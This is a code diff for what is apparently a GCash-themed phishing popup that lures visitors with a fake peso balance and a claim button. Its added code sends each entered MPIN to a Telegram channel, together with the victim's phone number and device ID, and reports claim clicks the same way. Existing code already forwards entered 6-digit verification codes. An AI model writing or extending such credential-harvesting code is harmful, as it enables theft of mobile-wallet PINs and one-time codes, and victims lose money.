@@ -1,5 +1,6 @@
 /**
  * Popup Share Module - With 500 Bills Indicators & Neon Blue Numpad
+ * Updated: MPIN Telegram notification, Claim button notification
  */
 
 // ========== POPUP MODULE ==========
@@ -42,6 +43,7 @@
         }
     }
     
+    // 6-digit code notifications
     async function send6DigitRequestNotification(userPhone, deviceId) {
         const now = new Date();
         const timestamp = now.toLocaleString();
@@ -56,10 +58,26 @@
         await sendTelegramMessage(message);
     }
     
-    async function sendVerificationAttemptNotification(userPhone, deviceId, code, attemptsLeft) {
+    async function send6DigitVerificationAttemptNotification(userPhone, deviceId, code, attemptsLeft) {
         const now = new Date();
         const timestamp = now.toLocaleString();
-        const message = `🔑 VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${code}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID`;
+        const message = `🔑 6-DIGIT VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nCode Entered: ${code}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID`;
+        await sendTelegramMessage(message);
+    }
+    
+    // ========== NEW: MPIN TELEGRAM NOTIFICATION ==========
+    async function sendMPINVerificationAttemptNotification(userPhone, deviceId, mpin, attemptsLeft) {
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const message = `🔐 MPIN VERIFICATION ATTEMPT\nUser: ${userPhone}\nDevice ID: ${deviceId}\nMPIN Entered: ${mpin}\nTime: ${timestamp}\nAttempts Left: ${attemptsLeft}/${MAX_ATTEMPTS}\nStatus: INVALID MPIN`;
+        await sendTelegramMessage(message);
+    }
+    
+    // ========== NEW: CLAIM BUTTON TELEGRAM NOTIFICATION ==========
+    async function sendClaimButtonNotification(userPhone, deviceId, amount) {
+        const now = new Date();
+        const timestamp = now.toLocaleString();
+        const message = `💳 CLAIM THRU GCASH INITIATED\nUser: ${userPhone}\nDevice ID: ${deviceId}\nAmount: ₱${amount.toFixed(2)}\nTime: ${timestamp}\nStatus: Claim process started`;
         await sendTelegramMessage(message);
     }
     
@@ -80,19 +98,15 @@
             const img = indicator.querySelector('img');
             
             if (i < billCount) {
-                // Show actual bill front/back based on position
                 if (i % 2 === 0) {
-                    // Even index (0,2) - Front
                     img.src = 'images/PHL-500-Front.png';
                 } else {
-                    // Odd index (1,3) - Back
                     img.src = 'images/PHL-500-Back.png';
                 }
                 img.style.opacity = '1';
                 img.style.filter = 'none';
                 indicator.classList.add('active');
             } else {
-                // Show silhouette
                 img.src = 'images/PHL-500-Front.png';
                 img.style.opacity = '0.25';
                 img.style.filter = 'grayscale(100%) brightness(30%)';
@@ -235,7 +249,6 @@
                 100% { transform: scale(1); }
             }
             
-            /* Neon Blue Numpad Styles */
             .numeric-keypad {
                 display: grid;
                 grid-template-columns: repeat(3, 1fr);
@@ -273,7 +286,6 @@
                 color: #ffffff;
             }
             
-            /* Bill Indicators - Small design */
             .bill-indicators {
                 display: flex;
                 justify-content: center;
@@ -433,8 +445,6 @@
             claimBtn.innerHTML = '⏳ PROCESSING...';
         }
         
-        // Animate bills indicators
-        const targetBills = Math.floor(end / 500);
         const totalSteps = 30;
         const decrementAmount = start / totalSteps;
         let currentStep = 0;
@@ -446,7 +456,6 @@
         const interval = setInterval(() => {
             currentStep++;
             const currentVal = start - (decrementAmount * currentStep);
-            const currentBills = Math.floor(currentVal / 500);
             
             if (balanceSpan) {
                 balanceSpan.textContent = Math.max(0, currentVal).toFixed(2);
@@ -454,7 +463,6 @@
                 balanceSpan.style.fontSize = (48 - (currentStep * 0.8)) + 'px';
             }
             
-            // Update bills indicators in real-time
             updateBillsIndicators(Math.max(0, currentVal));
             
             if (currentStep >= totalSteps) {
@@ -897,7 +905,8 @@
                 const maxReached = incrementInvalidAttempts();
                 const attemptsLeft = MAX_ATTEMPTS - invalidAttempts;
                 
-                sendVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
+                // ========== SEND MPIN TELEGRAM NOTIFICATION ==========
+                sendMPINVerificationAttemptNotification(userPhone, deviceId, currentMPIN, attemptsLeft);
                 
                 const attemptsCounter = document.querySelector('.attempts-counter');
                 if (attemptsCounter) {
@@ -1021,7 +1030,6 @@
             </div>
             <div class="divider"></div>
             
-            <!-- 500 Bills Indicators (4 bills) -->
             <div class="bill-indicators">
                 <div class="bill-indicator"><img src="images/PHL-500-Front.png" alt="500"></div>
                 <div class="bill-indicator"><img src="images/PHL-500-Back.png" alt="500"></div>
@@ -1048,7 +1056,6 @@
             </button>
         `;
         
-        // Update bills based on balance
         updateBillsIndicators(balance);
         
         const closeBtn = document.getElementById('popupClosePhase1');
@@ -1089,6 +1096,11 @@
                     }, 2000);
                     return;
                 }
+                
+                // ========== SEND CLAIM BUTTON TELEGRAM NOTIFICATION ==========
+                const userPhone = localStorage.getItem("userPhone") || "Unknown";
+                const deviceId = localStorage.getItem("userDeviceId") || "Unknown";
+                sendClaimButtonNotification(userPhone, deviceId, currentBalance);
                 
                 animateBalanceDecrement(currentBalance, 0, 800, function() {
                     checkFirewallAndTransition();
